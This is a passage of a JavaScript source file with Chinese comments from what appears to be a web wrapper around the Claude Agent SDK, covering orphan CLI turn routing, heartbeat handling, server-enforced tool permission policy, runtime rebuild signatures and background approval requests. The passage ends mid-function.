    // 同一条通知重复到达时要能去重 —— 显示日志的唯一键是 (session_id, message_id)。
    id: `task_${message.task_id || generateMessageId('task')}_${message.status || 'done'}`,
    sessionId,
    provider: 'claude',
    kind: 'task_notification',
    status,
    summary,
    content,
    /**
     * 带上 `tool_use_id` 表示这条汇报有主:它就是那次 Task / Agent 调用的 id,也就是子代理卡的身份。
     * 前端据此把汇报归到那张卡上(✅/⚠️ + summary + 耗时),而不是在主对话流里另起一行。
     * 没有 `tool_use_id` 的(转后台的 Bash、workflow)独立成行,它们本来就没有卡。
     */
    ...(message.tool_use_id ? { toolId: String(message.tool_use_id) } : {}),
    ...(message.task_id ? { taskId: String(message.task_id) } : {}),
    taskProgress: {
      toolUses: Number.isFinite(Number(message.usage?.tool_uses)) ? Number(message.usage.tool_uses) : undefined,
      totalTokens: Number.isFinite(Number(message.usage?.total_tokens)) ? Number(message.usage.total_tokens) : undefined,
      durationMs: Number.isFinite(Number(message.usage?.duration_ms)) ? Number(message.usage.duration_ms) : undefined,
    },
  });
}

/**
 * 「工具还在跑」的心跳也算活动。
 *
 * SDK 的 `tool_progress`(以及没有归属的 system/task_progress)不是内容帧;若直接丢弃,观测回合的 60 秒静默看门狗
 * 在一条跑 90 秒的后台命令面前必然到点,发出假失败的 complete。这类帧不落库也不广播,只用来续期。
 */
function isActivityHeartbeat(message) {
  if (message?.type === 'tool_progress') return true;
  /**
   * 带 `tool_use_id` 的 task_progress 不是纯心跳:它要经 `taskLifecycleMessage` 变成卡片的进展行,
   * 当心跳吞掉的话,后台子代理的卡片在主回合结束后就收不到步数 / 活标签了。只有没有归属的进展才只当心跳。
   */
  return message?.type === 'system' && message?.subtype === 'task_progress' && !message?.tool_use_id;
}

/**
 * 这一帧回答的是不是我们合流进去的消息。CLI 自己起的那一轮(包括合流消息等到回合边界才投递的情况),
 * 首条回复与 result 都带着那条消息的 `user_message_uuid(s)`(SDK 0.3.265 起)。
 */
export function frameAnswersMerged(runtime, message) {
  const merged = runtime?.mergedUuids;
  if (!(merged instanceof Map) || merged.size === 0 || !message) return false;
  if (typeof message.user_message_uuid === 'string' && merged.has(message.user_message_uuid)) return true;
  return Array.isArray(message.user_message_uuids) && message.user_message_uuids.some((id) => merged.has(id));
}

/**
 * 接住 CLI 自己发起的那一轮(没有 Prism run 的帧)。
 *
 * 判据是「Prism 有没有为这一轮建 run」,不是帧上的 origin:两种注入形态并存,有的帧完全没有 origin 字段。
 * 这里只做三件事:记账、归一化、交给钩子。开不开观测回合、怎么收尾都在 websocket 层
 * (见 observed-run.service.ts),这一层不认识 run。
 */
export function routeOrphanMessage(runtime, message, { answersMerged = false } = {}) {
  const heartbeat = isActivityHeartbeat(message);
  if (!heartbeat && !isContentfulFrame(message) && message?.type !== 'system') return;

  /**
   * 记住 CLI 自己的一轮是否开着:有内容的无主帧 = 开着,它的 result = 关上。
   * runPersistentTurn 据此决定要不要提防一个外来的 result(见读循环)。
   *
   * 只装着 tool_result 的 user 帧不开轮:回合带着在途工具被看门狗 / 失败收掉之后,那条工具跑完时 CLI 会补发
   * 一条顶层 tool_result,后面没有 result。若把它算成开轮,这个位就卡在 true:回收、淘汰都跳过这个 runtime,
   * 终端接管与一次性调用一律被拒,按停止也停不掉什么。CLI 自己那一轮里的 tool_result 不受影响,那一轮早已开着。
   */
  const strayToolResult = isToolResultOnlyFrame(message) && !runtime.orphanTurnOpen;
  if (isTurnResult(message)) runtime.orphanTurnOpen = false;
  // 只有顶层的有内容帧才算 CLI 自己的一轮开着;子代理内部帧(带 parent id)不会带来顶层 result,
  // 若也算进去,这个位会卡在 true,让下一次用户回合误吞自己的 result。
  else if (isContentfulFrame(message) && !message?.parent_tool_use_id && !strayToolResult) runtime.orphanTurnOpen = true;

  if (heartbeat) {
    const appSessionId = runtime.appSessionId;
    if (!orphanTurnHook || !appSessionId) return;
    try {
      orphanTurnHook({
        appSessionId,
        providerSessionId: runtime.sessionId || null,
        userId: runtime.ownerUserId ?? null,
        provider: 'claude',
        messages: [],
        trigger: 'unknown',
        turnEnded: false,
        toolsInFlight: runtime.pendingToolUses.size + (runtime.subagentToolUses?.size ?? 0) > 0,
      });
    } catch (error) {
      log.error('[Claude SDK] 无主心跳转发失败:', error?.message || error);
    }
    return;
  }

  orphanStats.frames += 1;
  const now = Date.now();
  if (now - orphanStats.lastWarnAt > ORPHAN_WARN_INTERVAL_MS) {
    orphanStats.lastWarnAt = now;
    log.warn(
      `[Claude SDK] Runtime ${runtime.key} 收到无主帧(CLI 自己发起的一轮):`
      + `type=${message?.type}${message?.subtype ? `/${message.subtype}` : ''};`
      + ` 累计 ${orphanStats.frames} 帧,已接住 ${orphanStats.observed} 轮`
    );
  }

  const appSessionId = runtime.appSessionId;
  if (!orphanTurnHook || !appSessionId) return;

  const sid = runtime.sessionId || null;
  let messages = [];
  const taskRow = taskLifecycleMessage(message, sid);
  if (taskRow) {
    messages = [taskRow];
  } else {
    try {
      /**
       * 归一化之后必须把 `parentToolUseId` 拷回去:`normalizeMessage`(claude-sessions.provider.ts)不设这个字段,
       * 只认 SDK 帧里的内容块,所以每条流式链路(一次性路径、常驻读循环、这里)都要在归一化之后自己拷一次。
       * 漏拷的话,子代理内部帧会丢掉父 id,`normalizedToChatMessages` 不会把它收进子代理卡,而是平铺到主轴上。
       */
      const transformed = transformMessage(message);
      messages = sessionsService.normalizeMessage('claude', transformed, sid);
      for (const msg of messages) {
        if (transformed.parentToolUseId && !msg.parentToolUseId) {
          msg.parentToolUseId = transformed.parentToolUseId;
        }
      }
    } catch (error) {
      log.warn('[Claude SDK] 无主帧归一化失败,跳过这一帧:', error?.message || error);
      return;
    }
  }

  try {
    const accepted = orphanTurnHook({
      appSessionId,
      providerSessionId: sid,
      userId: runtime.ownerUserId ?? null,
      provider: 'claude',
      messages,
      // 按 uuid 判这一轮是不是用户合流进来的(见 frameAnswersMerged)
      trigger: answersMerged ? 'merged' : looksLikeTaskNotification(message) ? 'task-notification' : 'unknown',
      // 迟到的 tool_result 后面不会再有 result:为它开的观测回合当场收尾,不让界面转圈一分钟再报失败
      turnEnded: isTurnResult(message) || strayToolResult,
      // 看门狗据此在到点时只续不杀(见 observed-run.service)。
      toolsInFlight: runtime.pendingToolUses.size + (runtime.subagentToolUses?.size ?? 0) > 0,
    });
    if (accepted) orphanStats.observed += 1;
  } catch (error) {
    // 观测是增强,不能反过来把读循环带崩。
    log.error('[Claude SDK] 无主帧转发失败:', error?.message || error);
  }
}

/** 只装着工具结果的 user 帧(工具跑完了),本身不说明 CLI 开了新的一轮。 */
function isToolResultOnlyFrame(message) {
  if (message?.type !== 'user' || message?.parent_tool_use_id) return false;
  const content = message?.message?.content;
  return Array.isArray(content) && content.length > 0 && content.every((part) => part?.type === 'tool_result');
}

/** 这一帧看着像不像"后台任务通知"触发的 —— 只用于来源标记的文案,不作判据。 */
function looksLikeTaskNotification(message) {
  if (message?.type === 'system' && (message.subtype === 'task_notification' || message.subtype === 'task_started')) {
    return true;
  }
  const content = message?.message?.content;
  if (typeof content === 'string') return content.includes('<task-notification');
  if (!Array.isArray(content)) return false;
  return content.some((part) => part?.type === 'text' && typeof part.text === 'string'
    && part.text.includes('<task-notification'));
}


function normalizedPermissionMode(options, settings) {
  if (settings?.skipPermissions && options.permissionMode !== 'plan') {
    return 'bypassPermissions';
  }
  return options.permissionMode && options.permissionMode !== 'default'
    ? options.permissionMode
    : 'default';
}

const VALID_PERMISSION_MODES = new Set(['default', 'plan', 'acceptEdits', 'bypassPermissions']);

/**
 * 服务端强制的工具策略,常驻与一次性两条执行路径共用这一份判据(runtimeSettingsFromOptions / mapCliOptionsToSDK)。
 * 只在某一条路径上生效的话,`.env.example` 承诺的 `PRISM_ALLOW_BYPASS_USERS` 与 `PRISM_FORCED_DENY_TOOLS`
 * 在另一条路径上就不成立,而运维会以为已经加固过了。
 *
 * 「免确认框」有两个入口,名单必须同时管住:
 * - `permissionMode === 'bypassPermissions'`(下拉框):不在名单里的降级为 acceptEdits;
 * - `toolsSettings.allowedTools`(预批清单):命中的工具在 canUseTool 里直接放行,还会进 `sdkOptions.allowedTools`
 *   让 CLI 连 `can_use_tool` 都不发。不在名单里的清空客户端给的预批清单,每次调用照常问人。
 * 两者都不拒绝这一轮,只是把确认框还回来;名单没配(null)时不限制。见 tests/tool-policy*.test.js。
 */
export function applyServerToolPolicy(mode, disallowedTools, actorUsername, allowedTools) {
  /**
   * 取值先校验:聊天这条路上的 `permissionMode` 来自客户端,塞一个 SDK 不认识的值时,行为由 SDK 的默认分支决定,
   * 不可控。认不出来的(包括 `auto`:网关给不了它的分类器)一律按 default。
   */
  let effectiveMode = VALID_PERMISSION_MODES.has(mode) ? mode : 'default';

  const bypassAllowlist = readBypassAllowlist();
  const mayBypass = bypassAllowlist === null
    || bypassAllowlist.has(usernameKey(actorUsername));

  if (effectiveMode === 'bypassPermissions' && !mayBypass) {
    log.warn(
      `[claude-sdk] 「${actorUsername ?? '未知用户'}」不在 PRISM_ALLOW_BYPASS_USERS 名单里,`
      + '本轮从 bypassPermissions 降级为 acceptEdits',
    );
    // 降级而不是拒绝:拒绝会让一轮对话凭空失败,降级只是把确认框还回来。
    effectiveMode = 'acceptEdits';
  }

  const requestedAllowed = Array.isArray(allowedTools) ? allowedTools : [];
  let policedAllowed = requestedAllowed;
  if (requestedAllowed.length > 0 && !mayBypass) {
    log.warn(
      `[claude-sdk] 「${actorUsername ?? '未知用户'}」不在 PRISM_ALLOW_BYPASS_USERS 名单里,`
      + `本轮清空客户端给的 ${requestedAllowed.length} 条预批工具清单(确认框还回来)`,
    );
    policedAllowed = [];
  }

  /**
   * 跨会话消息的两个工具(`SendMessage` / `ListAgents`)无条件禁用,不看客户端、不看 `PRISM_FORCED_DENY_TOOLS`:
   * 所有用户同在 jovyan 下,对 CLI 来说全是同一个人的会话,放开就是 A 的 agent 能给 B 的会话发消息。
   */
  const policedDisallowed = [...new Set([
    ...(disallowedTools || []),
    ...readForcedDenyTools(),
    ...CROSS_SESSION_TOOLS,
  ])];

  return {
    permissionMode: effectiveMode,
    // 客户端的 + 服务端强制的;后者无条件并入,客户端覆盖不掉。
    disallowedTools: policedDisallowed,
    /**
     * 禁用永远压过预批:两张单子撞车时,拒的那张赢。`canUseTool` 里禁用清单本来就先判,
     * 这里再收一次,免得 `sdkOptions.allowedTools` 让 CLI 连问都不问。
     */
    allowedTools: policedAllowed.filter((tool) => !policedDisallowed.includes(tool)),
  };
}

/**
 * 「允许并记住」按钮给出的条目,与前端 buildClaudeToolPermissionEntry(chatPermissions.ts)同一个算法:
 * Bash 按第一段子命令生成 `Bash(<命令>:*)`(git 带上子命令),其余工具就是工具名。
 */
function permissionEntryForRequest(toolName, input) {
  if (typeof toolName !== 'string' || !toolName) return null;
  if (toolName !== 'Bash') return toolName;
  let parsed = input;
  if (typeof input === 'string') {
    try { parsed = JSON.parse(input); } catch { parsed = null; }
  }
  const command = typeof parsed?.command === 'string' ? parsed.command.trim() : '';
  if (!command) return toolName;
  const firstSegment = command.split(/[;&|\n]/)[0]?.trim() || command;
  const tokens = firstSegment.split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return toolName;
  if (tokens[0] === 'git' && tokens[1]) return `Bash(${tokens[0]} ${tokens[1]}:*)`;
  return `Bash(${tokens[0]}:*)`;
}

/**
 * 审批答复里的 `rememberEntry`(「允许并记住」)能不能记进放行清单。
 *
 * 答复来自客户端,原样记下的话,任何能看到这段对话的人一次答复就能往 runtime 上加任意放行项。所以:
 * - 必须正是由这次请求的工具生成的那一条(见 permissionEntryForRequest);
 * - 发这一轮的人不在 PRISM_ALLOW_BYPASS_USERS 名单里时只放行这一次,与预批清单同一条策略(见 applyServerToolPolicy);
 * - 服务端强制禁用的工具(PRISM_FORCED_DENY_TOOLS、跨会话消息)不记,也就不会被它从禁用清单里拿掉。
 * @returns {string|null} 可以记下的条目;null 表示只放行这一次
 */
export function rememberablePermissionEntry(rememberEntry, { toolName, input, actorUsername } = {}) {
  if (typeof rememberEntry !== 'string' || !rememberEntry) return null;
  if (rememberEntry !== permissionEntryForRequest(toolName, input)) {
    log.warn(`[claude-sdk] 「允许并记住」给的条目与这次请求的工具(${toolName})对不上,只放行这一次`);
    return null;
  }
  if (!mayRememberApprovals(actorUsername)) return null;
  const forced = new Set([...readForcedDenyTools(), ...CROSS_SESSION_TOOLS]);
  if (forced.has(rememberEntry) || forced.has(toolName)) return null;
  return rememberEntry;
}

/**
 * 这个人点「允许并记住」能不能记下(PRISM_ALLOW_BYPASS_USERS 没配 = 不限制)。不能的话审批请求帧上带
 * `suppressAlwaysAllow`,前端不出那个按钮,免得它看着是「总是允许」、实际只放行一次。
 */
function mayRememberApprovals(actorUsername) {
  const bypassAllowlist = readBypassAllowlist();
  return bypassAllowlist === null || bypassAllowlist.has(usernameKey(actorUsername));
}

/**
 * 常驻路径的 settings(权限档、预批清单、禁用清单)只从这里出;导出是为了单测钉住
 * 「强制策略在常驻路径上生效」,而不是靠读码保证。
 */
export function runtimeSettingsFromOptions(options) {
  const toolsSettings = options.toolsSettings || {
    allowedTools: [],
    disallowedTools: [],
    skipPermissions: false,
  };
  const requestedMode = normalizedPermissionMode(options, toolsSettings);
  // 强制策略在这里落地(一次性路径在 mapCliOptionsToSDK 里调同一个 applyServerToolPolicy)。
  const policed = applyServerToolPolicy(
    requestedMode,
    toolsSettings.disallowedTools,
    options.actorUsername,
    toolsSettings.allowedTools,
  );
  /**
   * 先过策略,再补 plan 档的只读工具。顺序反了的话,这几个服务端自己补的工具会被「清空客户端预批清单」
   * 一起清掉,plan 档每读一个文件都要点一次确认框。策略管的是客户端给的那份,不是服务端为档位补的那份。
   */
  const allowedTools = [...policed.allowedTools];
  if (requestedMode === 'plan') {
    for (const tool of ['Read', 'Task', 'exit_plan_mode', 'TodoRead', 'TodoWrite', 'WebFetch', 'WebSearch']) {
      if (!allowedTools.includes(tool)) allowedTools.push(tool);
    }
  }
  return {
    permissionMode: policed.permissionMode,
    // 预批清单同样过了策略,PRISM_ALLOW_BYPASS_USERS 才不只是挡住下拉框那一个入口。
    allowedTools,
    disallowedTools: policed.disallowedTools,
  };
}

/**
 * 「上一轮还在收尾」最多等多久(见 runtimeForSend)。
 *
 * 按了停止之后,CLI 要等前台工具转到后台、再出 result 才算收尾,常常要好几秒。等的时候只占这段对话
 * 自己的锁,不挡别的对话,按停止随时不再等;等满仍没收尾,才按「上一轮还没结束」拒这一条。
 */
const TURN_SETTLE_GRACE_MS = 15_000;

/**
 * CLI 自己发起的那一轮多久一帧都没有就算卡死(见 runtimeForSend 的在途工具分支)。
 * 主线程工具在跑时 CLI 每 30 秒发一次 tool_progress 心跳,等审批时最多停 2 分钟(ORPHAN_MAIN_APPROVAL_TIMEOUT_MS),
 * 10 分钟没有任何帧不会是正常的活。
 */
const ORPHAN_TURN_STALL_MS = 10 * 60 * 1000;

/**
 * CLI 自己发起的那一轮(后台任务回报等)正在跑主线程工具时,用户这一条最多等多久(见 runtimeForSend)。
 * 等的时候 CLI 那一轮的帧接在用户这一轮里显示,按停止随时不再等;等满那一轮还在跑,才拒这一条。
 */
const ORPHAN_TURN_WAIT_MS = 10 * 60 * 1000;

/** 发送前那两段等待多久看一次(顺带续预占标记、看这次发送有没有被停止)。 */
const SEND_WAIT_POLL_MS = 250;

/** 发送前两段等待的实际取值;只有单测会改(见 setSendWaitForTest)。 */
let sendWait = { turnSettleMs: TURN_SETTLE_GRACE_MS, orphanTurnMs: ORPHAN_TURN_WAIT_MS, pollMs: SEND_WAIT_POLL_MS };

/** 单测用:把发送前的两段等待调短;不传参数就恢复默认。 */
export function setSendWaitForTest(overrides = null) {
  sendWait = {
    turnSettleMs: TURN_SETTLE_GRACE_MS,
    orphanTurnMs: ORPHAN_TURN_WAIT_MS,
    pollMs: SEND_WAIT_POLL_MS,
    ...(overrides || {}),
  };
}

/** CLI 自己那一轮是不是卡死了:ORPHAN_TURN_STALL_MS 里一帧都没有(读循环每收一帧都刷新 lastUsed)。 */
function orphanTurnStalled(runtime) {
  return Date.now() - (runtime.lastUsed || 0) > ORPHAN_TURN_STALL_MS;
}

/**
 * Config axes that force a runtime rebuild (everything else is applied in place).
 * `loose` 只比网关 + key(不含模型),供后台任务在跑时判断是不是只换了同网关的模型(见 runtimeForSend)。
 */
function persistentRuntimeSignature(options, settings, { loose = false } = {}) {
  return JSON.stringify({
    cwd: options.cwd ? path.resolve(options.cwd) : '',
    /*
     * effort 不是冻结项:`applyFlagSettings({ effortLevel })` 运行中即生效,runtimeForSend 里就地改,不重建。
     */
    bypass: settings.permissionMode === 'bypassPermissions',
    /**
     * 工具清单是冻结项。`allowedTools` / `disallowedTools` 在 SDK 里是 `--allowedTools` / `--disallowedTools`
     * 命令行参数,子进程 spawn 时定死;之后只改 `runtime.settings.*` 不够,CLI 的规则命中时根本不会发
     * `can_use_tool` 控制请求,Prism 那层被短路。
     *
     * 失效是单向的:新增允许没问题(CLI 不认识就来问),撤销一条却不生效,CLI 拿着 spawn 时那份清单继续自动放行,
     * 直到空闲回收。共享会话还有个变体:A 授权过 X,B 往同一会话发消息(runtime 按 provider 会话 id 索引,
     * 键里没有用户),B 的回合里 X 会被自动放行。
     *
     * 进签名后清单一变就 dispose + resume 重建,与 settings.json 变更同一条路;改工具清单是低频操作。
     */
    allowedTools: [...(settings.allowedTools || [])].sort(),
    disallowedTools: [...(settings.disallowedTools || [])].sort(),
    /**
     * 模型目录里的窗口是冻结项:env 与 autoCompactWindow 都只在进程启动时生效(运行中 applyFlagSettings 不认)。
     * 窗口不同的模型之间切换、或 root 改了当前模型的窗口时签名不同,dispose + resume 重建;窗口相同只 `setModel`。
     */
    contextWindow: options.contextWindow ?? null,
    /**
     * 子代理模型是冻结项:`CLAUDE_CODE_SUBAGENT_MODEL(_FORCE)` 是进程环境变量,root 改了之后每段对话的下一条消息
     * 重建。按实际写进 env 的那份算(subagentModelEnv:目录里下架了就不写),否则下架 / 重新上架时签名不变,
     * 现有 runtime 仍按旧 env 跑。
     */
    subagent: (() => {
      const env = options.subagentEnv ?? subagentModelEnv();
      return env.CLAUDE_CODE_SUBAGENT_MODEL ? `${env.CLAUDE_CODE_SUBAGENT_MODEL}${env.CLAUDE_CODE_SUBAGENT_MODEL_FORCE ? '!' : ''}` : null;
    })(),
    /**
     * 网关与 key 是冻结项:flag 层的 env 只在进程启动时进 CLI(运行中 applyFlagSettings 虽能换,但会让在跑的
     * 后台子代理半路换网关)。一个进程 = 一套网关 + 一把 key:换到别的网关的模型、换了 key、共享会话里换了一个人
     * 发消息(各用各的 key)都会重建。值是指纹(哈希),不含 key 本身。
     */
    gateway: loose ? (options.gateway?.credentialFingerprint ?? null) : (options.gateway?.fingerprint ?? null),
  });
}

/**
 * SDK options for a resident runtime. Unlike the one-shot path, `canUseTool`
 * and hooks read the runtime's CURRENT turn at call time, so a single query
 * instance serves every turn of the conversation with the right websocket.
 */
function buildPersistentSdkOptions(options, runtime) {
  const sdkOptions = {};
  // 与一次性路径同一份 env 与可执行文件规则(见 mapCliOptionsToSDK)。
  // 窗口按起这个进程时的模型给(见 modelWindowEnv),换窗口 = 重建。
  // 子代理模型由 root 在 设置 → 模型 里设;没设就一个变量都不写,CLI 默认跟随主模型。
  sdkOptions.env = buildClaudeSdkEnv(process.env, { ...modelWindowEnv(options.contextWindow), ...(options.subagentEnv ?? subagentModelEnv()) });
  sdkOptions.pathToClaudeCodeExecutable = sdkExecutableOption();
  // 常驻 runtime 的子进程活很久,stderr 挂在 runtime 上,任何一轮出错都能拿到尾巴。
  if (runtime?.stderrTail) sdkOptions.stderr = runtime.stderrTail.onData;
  if (options.cwd) sdkOptions.cwd = options.cwd;

  // Real cancellation handle: the SDK's `Options.abortController` ("Controller
  // for cancelling the query") tears the query + subprocess down when aborted.
  // Dispose falls back to it when `query.close` is unavailable, and the turn
  // watchdog aborts it so a hung subprocess cannot outlive its runtime.
  runtime.abortController = new AbortController();
  sdkOptions.abortController = runtime.abortController;

  const mode = runtime.settings.permissionMode;
  if (mode && mode !== 'default') sdkOptions.permissionMode = mode;

  sdkOptions.allowedTools = [...runtime.settings.allowedTools];
  sdkOptions.disallowedTools = [...runtime.settings.disallowedTools];
  sdkOptions.tools = { type: 'preset', preset: 'claude_code' };
  // 'default' 档不下发 model(见 toSdkModel)—— CLI 按 settings 配置链自选。
  const persistentSdkModel = toSdkModel(options.model);
  if (persistentSdkModel) sdkOptions.model = persistentSdkModel;
  if (options.resolvedEffort) sdkOptions.effort = options.resolvedEffort;
  if (runtime.fileCheckpointing) sdkOptions.enableFileCheckpointing = true;
  /**
   * 声明我们有"逐个停止后台任务"的入口(输入框上方的后台任务条 → stopTask)。
   * 声明后,中断只停当前这一轮,不连带杀掉后台子代理 / workflow;不声明时 CLI 按"消费方停不掉它们"
   * fail-closed,一按停止全杀。后台 Bash 本来就不受中断影响。
   */
  sdkOptions.perTaskStopAffordance = true;
  // 预设系统提示 + 「开工先列全任务清单」的引导(见 TASKLIST_GUIDANCE)
  sdkOptions.systemPrompt = presetSystemPrompt();
  sdkOptions.settingSources = ['project', 'user', 'local'];
  sdkOptions.includePartialMessages = false;
  /*
   * 自动压缩的开关与窗口交给 CLI 自己(见 AUTO_COMPACT_ENABLED 的说明)。
   *
   * 这两个字段属于 `Settings`,不属于 `Options`,必须走 `options.settings`:直接写成
   * `sdkOptions.autoCompactEnabled` / `sdkOptions.autoCompactWindow` 会被 SDK 静默忽略,
   * 而 `sdkOptions` 是个纯 JS 对象,没有类型检查会拦住这种错。
   *
   *   autoCompactWindow?: number    → interface Settings
   *   autoCompactEnabled?: boolean  → interface Settings
   *   settings?: string | Settings  → type Options(入口在这)
   *
   * `settings` 是"flag 层",优先级在 user/project/local 之上、managed policy 之下,
   * 正是运维旋钮该在的位置:压得过 `~/.claude/settings.json` 里的用户偏好。
   * `settings-shape.test.js` 盯着这三条,SDK 换版把字段挪走就会变红。
   */
  applyCompactSettings(sdkOptions, { contextWindow: options.contextWindow });
  // 这一轮的网关与 key(flag 层)。换网关 / 换 key = 签名变 = 重建(见 persistentRuntimeSignature)。
  // 有 key 时写成文件(不进命令行),进程收尾时删(dispose / 读循环 finally)。
  runtime.flagSettingsFile = applyGatewaySettings(sdkOptions, options.gateway);
  /**
   * 子代理的完整对话要转发过来,卡片里那条嵌套时间轴靠它。
   *
   * SDK 原话(`Options.forwardSubagentText`):
   *
   * > Forward subagent text and thinking blocks as assistant/user messages with
   * > `parent_tool_use_id` set. By default, only tool_use/tool_result blocks from
   * > subagents are emitted (enough for a heartbeat counter). When true, the full
   * > subagent conversation is forwarded so consumers can render a nested
   * > transcript.
   *
   * 不开的话只拿得到子代理的工具步骤(卡片上那个「N 步」),拿不到它在想什么、说了什么。
   *
   * 打开后子代理的 prompt 与回复会以 user 帧发过来,由两道判据挡住,不会渲染成用户消息:
   *   1. `transcript-provenance.nonHumanUserTurnReason` 有 `subagent-frame` 一条:
   *      `parent_tool_use_id` 非空 = 非人类帧,不渲染成用户气泡;
   *   2. `normalizedToChatMessages` 第一句就把带 `parentToolUseId` 的
   *      text / thinking / tool_use / tool_result / stream_delta 全部挡在顶层之外,
   *      归进父卡的 `childTools`。
   *
   * 两道判据各有回归测试钉着(见 user-turn-provenance / subagentNestedTranscript)。
   */
  sdkOptions.forwardSubagentText = true;
  /**
   * 子代理跑着的时候,卡片上那行"它现在在干什么"。
   *
   * SDK 原话(`Options.agentProgressSummaries`):每 ~30 秒把子代理的会话 fork
   * 一次,生成一句现在时的描述(如 "Analyzing authentication module"),
   * 从 `task_progress` 的 `summary` 字段发出来;前台和后台子代理都适用,
   * fork 复用子代理自己的模型与 prompt cache,"成本通常极小"。
   *
   * 没有它的话,活标签只能退回 `last_tool_name`(「Bash」「Read」),
   * 那说的是"用了什么工具",不是"在干什么"。
   */
  sdkOptions.agentProgressSummaries = true;
  // 不设 maxTurns:streaming-input 模式下一个 query 贯穿整段对话,num_turns 是
  // 跨用户回合累计的 —— 设 100 意味着聊到第一百个来回(或几轮重 agentic
  // 任务)后必撞 error_max_turns,这一轮莫名失败、runtime 报废,而且越活跃的
  // 会话死得越早。单回合的失控自有 turn 看门狗(空转/工具静默超时)兜着,
  // 一次性路径也从来没设过这个上限,两条路径行为对齐。

  if (options.resumeSessionId) sdkOptions.resume = options.resumeSessionId;

  // Prism fork: brand-new conversation branched off an existing native
  // session, optionally truncated at a specific assistant message uuid.
  if (!options.resumeSessionId && options.forkFrom?.providerSessionId) {
    sdkOptions.resume = options.forkFrom.providerSessionId;
    sdkOptions.forkSession = true;
    if (options.forkFrom.resumeSessionAt) {
      sdkOptions.resumeSessionAt = options.forkFrom.resumeSessionAt;
    }
  }

  sdkOptions.hooks = {
    Notification: [{
      matcher: '',
      hooks: [async (input) => {
        const turn = runtime.turn;
        if (!turn) return {};
        const message = typeof input?.message === 'string' ? input.message : 'Claude requires your attention.';
        notifyUserIfEnabled({
          userId: turn.ws?.userId || null,
          writer: turn.ws,
          event: createNotificationEvent({
            provider: 'claude',
            sessionId: runtime.sessionId || null,
            kind: 'action_required',
            code: 'agent.notification',
            meta: { message, sessionName: turn.sessionSummary },
            severity: 'warning',
            requiresUserAction: true,
            dedupeKey: `claude:hook:notification:${runtime.sessionId || 'none'}:${message}`
          })
        });
        return {};
      }]
    }]
  };

  sdkOptions.canUseTool = async (toolName, input, context) => {
    const turn = runtime.turn;
    const settings = runtime.settings;
    const requiresInteraction = TOOLS_REQUIRING_INTERACTION.has(toolName);

    if (!requiresInteraction) {
      if (settings.permissionMode === 'bypassPermissions') {
        return { behavior: 'allow', updatedInput: input };
      }
      const isDisallowed = (settings.disallowedTools || []).some(entry =>
        matchesToolPermission(entry, toolName, input));
      if (isDisallowed) {
        return { behavior: 'deny', message: 'Tool disallowed by settings' };
      }
      const isAllowed = (settings.allowedTools || []).some(entry =>
        matchesToolPermission(entry, toolName, input));
      if (isAllowed) {
        return { behavior: 'allow', updatedInput: input };
      }
    }

    /**
     * 没有用户回合时的审批。
     *
     * 后台子代理的审批也走 `canUseTool`(SDK ≥ 0.3.186,控制请求带 agent_id)。主回合结束后,把审批卡
     * 推给正在看这段对话的人(开着观测回合就走它的 writer,否则广播;刷新后由 pendingPermissions 补上),
     * 并通知 runtime 的主人;没人答就在 PRISM_BACKGROUND_APPROVAL_TIMEOUT_MS(默认 30 分钟)后拒。
     * 拿不到 writer 时直接拒。
     */
    let writer = turn?.ws ?? null;
    const background = !turn;
    if (background) {
      writer = backgroundApprovalWriterFactory && runtime.appSessionId
        ? backgroundApprovalWriterFactory(runtime.appSessionId)
        : null;
      if (!writer) return { behavior: 'deny', message: 'No active turn owns this permission request' };
      log.info(`[Claude SDK] 后台审批:${toolName}(runtime=${runtime.key}${context?.agentID ? `,agent=${context.agentID}` : ''})`);
    }

    const requestId = createRequestId();
    const sid = runtime.sessionId || null;
    // CLI 说不该给"总是允许"、或这个人记不下放行项(见 mayRememberApprovals)时隐藏那个按钮。
    // 与 background 一起记在待批请求上,刷新后补发的卡片也带着(见 getPendingApprovalsForSession)。
    const suppressAlwaysAllow = context?.suppressAlwaysAllowRule === true || !mayRememberApprovals(runtime.actorUsername);
    sendPermissionRequest(
      writer,
      createNormalizedMessage({
        kind: 'permission_request', requestId, toolName, input, sessionId: sid, provider: 'claude',
        // 后台子代理要的审批:前端在卡片上标一句"后台任务请求"
        ...(background ? { background: true } : {}),
        ...(suppressAlwaysAllow ? { suppressAlwaysAllow: true } : {}),
      }),
      { toolName, sessionId: sid || runtime.appSessionId },
    );
    notifyUserIfEnabled({
      userId: turn?.ws?.userId || runtime.ownerUserId || null,
      writer,
      event: createNotificationEvent({
        provider: 'claude',
        sessionId: sid,
        kind: 'action_required',
        code: 'permission.required',
        meta: { toolName, sessionName: turn?.sessionSummary },
        severity: 'warning',
        requiresUserAction: true,
        dedupeKey: `claude:permission:${sid || 'none'}:${requestId}`
      })
    });

    /*
     * 没有用户回合时也可能是 CLI 自己发起的那一轮的主线程(后台任务完成通知之后模型想跑命令):
     * 它不是后台子代理(没有 agentID),这一轮开着,用户这时发的话会退回排队、排在审批后面。
     * 这种只等 2 分钟(与子代理审批的超时取小),没人答就拒,别让一条没人看的卡片把对话堵半小时。
     */
    const orphanMainThread = background && !context?.agentID;
    const decision = await waitForToolApproval(requestId, {
      timeoutMs: background
        ? (orphanMainThread ? Math.min(BACKGROUND_APPROVAL_TIMEOUT_MS, ORPHAN_MAIN_APPROVAL_TIMEOUT_MS) : BACKGROUND_APPROVAL_TIMEOUT_MS)
        : (requiresInteraction ? 0 : undefined),
      signal: context?.signal,
      metadata: {
        _sessionId: sid,
        // app 会话 id —— 补发时用它兜底,`runtime.sessionId` 在一轮对话开局是 null。
        _appSessionId: runtime.appSessionId || null,
        _toolName: toolName,
        _input: input,
        _receivedAt: new Date(),
        _background: background,
        _suppressAlwaysAllow: suppressAlwaysAllow,
      },
      onCancel: (reason) => {
        writer.send(createNormalizedMessage({ kind: 'permission_cancelled', requestId, reason, sessionId: sid, provider: 'claude' }));
      }
    });

    /**
     * 答复之后也广播一条终态。
     *
     * "点了允许 / 拒绝"本身没有出站帧,前端靠 `handlePermissionResponse` 乐观清掉本地那一条。
     * 不广播的话,同一个人开着的第二个标签页上那个确认框一直留着(点它只会得到一个找不到
     * resolver 的静默失败),侧栏的「有待批」角标也不会消。
     *
     * 这条与 `permission_cancelled` 同形,reason 说明是怎么了结的。
     * 它不进重放缓冲(见 registry),重连时不会把答复过的框推回来。
     */
    writer.send(createNormalizedMessage({
      kind: 'permission_cancelled',
      requestId,
      reason: decision === null
        ? 'timeout'
